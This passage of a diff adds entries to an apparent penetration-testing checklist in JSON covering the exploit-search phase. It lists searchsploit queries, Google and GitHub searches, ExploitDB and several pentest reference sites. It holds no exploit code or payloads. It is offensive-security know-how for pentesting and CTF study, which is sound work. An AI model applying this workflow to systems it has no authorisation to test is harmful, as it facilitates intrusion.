+     "remarks": "Some of these modules might use a wordlist for a BF attack. Make sure to check the threads and the list size before using these module.\n\nAlways read the msfconsole \"info\" page a module before using the same",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Wildcard Articles",
+     "command": "-",
+     "command_desc": "While performing all this research on understanding the port and the service we will stumble upon multiple articles that can be helpful to us.",
+     "description": "",
+     "remarks": "-",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Google Search",
+     "command": "-",
+     "command_desc": "Searching information about the service along with the version which has been enumerated using nmap.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Exploitation and Exploit Search",
+     "method": "Searchsploit",
+     "command": "searchsploit <service name>\nsearchsploit <service-name version>",
+     "command_desc": "List all the exploits related to that service.\nList all the exploits related to that service for that particular version.\n\nExploits are segregated by types\nWebapps- web application based exploits\nRemote - exploits that can be used remotly\nLocal - exploits that are used locally from within a system mostly post exploitations\nDDoS - denial of service exploits",
+     "description": "",
+     "remarks": "Simple the serach better the results.",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Google Search",
+     "command": "<service> exploits\nservice CTF",
+     "command_desc": "List different blogs, books which can be used in the exploitation process\nList different blogs, books, walkthroughs which can be refered for exploitation process",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Github Script",
+     "command": "<service> exploits github scripts",
+     "command_desc": "List different scripts, payloads and process which can be used in exploitation of these services",
+     "description": "",
+     "remarks": "Make sure to read the scripts as those scripts can contain malicious codes which might lead to an unexpected turn of events.",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "ExploitDB",
+     "command": "https://www.exploit-db.com/",
+     "command_desc": "exploitDB search allows you to search all the exploits related to that service.\nExploits are segregated by types\nWebapps- web application based exploits\nRemote - exploits that can be used remotly\nLocal - exploits that are used locally from within a system mostly post exploitations\nDDoS - denial of service exploits\n\nThen we have different platforms and languages on which these exploits depends.",
+     "description": "",
+     "remarks": "use the exploits after understanding the usage, platform, behaviors and impact,",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Other Websites",
+     "command": "https://exploit-notes.hdks.org/\nhttps://www.thehacker.recipes/\nhttps://viperone.gitbook.io/\nhttps://www.ired.team/\nhttps://book.hacktricks.xyz/\n- https://guide.offsecnewbie.com/\n- https://hunter2.gitbook.io/darthsidious/\nhttps://pentestbook.six2dez.com/\nhttps://github.com/wtsxDev/Penetration-Testing\nhttps://gowthams.gitbook.io/bughunter-handbook\nhttps://sushant747.gitbooks.io/total-oscp-guide/content/",
+     "command_desc": "List of books that will provide guidance in pen-testing a service.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    }
+   ]
+  }
+ ]
+}
